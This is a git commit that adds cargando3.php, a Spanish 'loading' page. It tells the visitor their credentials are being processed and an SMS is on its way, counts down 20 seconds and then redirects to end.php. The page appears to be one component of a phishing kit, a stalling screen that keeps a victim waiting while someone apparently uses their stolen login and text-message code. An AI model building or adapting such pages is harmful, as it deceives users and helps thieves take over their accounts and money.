3107e5b46d349e12ce0d80b45f8cceeaaa3c0313
peronasloading <123129985+peronasloading@users.noreply.github.com>
2023-01-19 18:54:19 -0500

    Add files via upload

---
+++ cargando3.php
@@ -0,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="es" class="notranslate wf-rubik-n3-active wf-rubik-n5-active wf-rubik-n4-active wf-active">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta name="viewport" content="user-scalable=no,initial-scale=0.65,maximum-scale=0.65,minimum-scale=0.65,width=device-width,viewport-fit=cover">
+
+<title>Home</title>
+<link href="assets/1.2b923407.chunk.css" rel="stylesheet">
+<link href="assets/main.27735bb0.chunk.css" rel="stylesheet">
+<link rel="stylesheet" href="./ilfs/css" media="all">
+<link href="assets/estilito.css" rel="stylesheet">
+
+	 <script language="JavaScript">
+	var tiempo=20;
+    var url="end.php";
+ 
+    function updateReloj()
+    {
+        document.getElementById('contador').innerHTML = "Estamos procesando sus credenciales. <br> Por favor, espera "+tiempo+" segundos, <br> te estamos enviando un mensaje de texto.";
+ 
+        if(tiempo==0)
+        {
+            window.location=url;
+        }else{
+            tiempo-=1;
+            setTimeout("updateReloj()",1000);
+        }
+    }
+   window.onload=updateReloj;
+ 
+    </script>
+
+</head>
+
+<body style="background-color: rgb(255, 255, 255);">
+
+
+<div id="root"><div class="sc-brCNVJ gnDTjt"><div class="sc-hBEYos ePjtkM">
+
+<form action="" method="post">
+<img src="assets/image/sub.png" style="width:65%;">
+
+
+ <div align="center">
+  <span style="color:#ffffff; font-size:32px;">Cargando...</span><br><br>
+ <img src="assets/image/lod.gif" style="width:200px;border:none;"> 
+  <br> <br>
+  <span style="color:#ffffff; font-size:20px;"  id="contador"></span>
+ </div>
+ 
+
+
+ <br>
+ <p class="sc-iktFzd eHsFGL">
+ 
+ 
+
+
+
+ </p>
+ <div class="sc-iBPRYJ gAgoSu">
+  <br> <br>
+
+</div>
+</form>
+
+</div></div></div>
+
+ 
+
+  </body>
+  </html>
